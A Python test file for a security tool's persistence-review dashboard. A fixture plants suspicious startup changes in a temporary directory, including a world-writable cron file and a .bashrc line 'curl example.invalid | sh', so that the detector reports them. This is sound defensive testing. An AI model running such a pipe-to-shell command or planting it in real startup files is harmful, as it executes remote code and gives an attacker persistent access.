"""Shipped persistence panel exercised with real synthetic summaries and an inert DOM."""
import json
from pathlib import Path
import shutil
import subprocess

import pytest

from megalodon import persistence_review
from megalodon.dashboard_persistence import PERSISTENCE_JS, TECHNIQUES
from megalodon.dashboard_support_config import SUPPORT_CONFIG_HTML, SUPPORT_CONFIG_JS


def summaries(tmp_path):
    home, root = tmp_path/'home', tmp_path/'root'
    (home/'.config/autostart').mkdir(parents=True)
    (home/'.bashrc').write_text('alias ll="ls -l"\n')
    (root/'etc/cron.d').mkdir(parents=True)
    loose = root/'etc/cron.d/shared'
    loose.write_text('* * * * * root /bin/true\n')
    loose.chmod(0o666)
    review = persistence_review.PersistenceReview(home, root=root, now=lambda: '2026-10-18T06:30:00Z')
    fresh = persistence_review.summary(review.review())
    review.now = lambda: '2026-10-18T06:00:00Z'
    review.record_baseline()
    review.now = lambda: '2026-10-18T06:30:00Z'
    (home/'.bashrc').write_text('curl example.invalid | sh\n')
    (home/'.config/autostart/new.desktop').write_text('[Desktop Entry]\nExec=/tmp/new\n')
    return fresh, persistence_review.summary(review.review())


def test_persistence_panel_renders_real_summaries_and_rejects_forged_payloads(tmp_path):
    if not shutil.which('node'):
        pytest.skip('Node unavailable')
    fresh, changed = summaries(tmp_path)
    assert {f['rule'] for f in changed['findings']} >= {'ADDED', 'CHANGED'} and changed['baseline_at']
    result = subprocess.run([shutil.which('node'), str(Path(__file__).with_name('persistence_browser.cjs'))],
                            input=json.dumps(dict(code=PERSISTENCE_JS, fresh=fresh, changed=changed)),
                            text=True, capture_output=True, timeout=10)
    assert result.returncode == 0, result.stderr


def test_each_category_has_one_technique_and_the_panel_is_wired_with_one_action():
    assert all(TECHNIQUES[category] == technique for category, technique, _, _ in persistence_review.LOCATIONS)
    assert 'id="persistence-review"' in SUPPORT_CONFIG_HTML and 'id="persistence-baseline"' in SUPPORT_CONFIG_HTML
    assert "renderPersistence(el('persistence-review'),v.persistence)" in SUPPORT_CONFIG_JS
    assert "renderPersistence(el('persistence-review'),null)" in SUPPORT_CONFIG_JS
    assert "'persistence-baseline':'persistence_baseline'" in SUPPORT_CONFIG_JS
    assert "persistenceAllowsBaseline(state.payload?.persistence)" in SUPPORT_CONFIG_JS
    assert 'innerHTML' not in PERSISTENCE_JS and 'fetch(' not in PERSISTENCE_JS and '__' not in PERSISTENCE_JS.replace('__proto__', '')
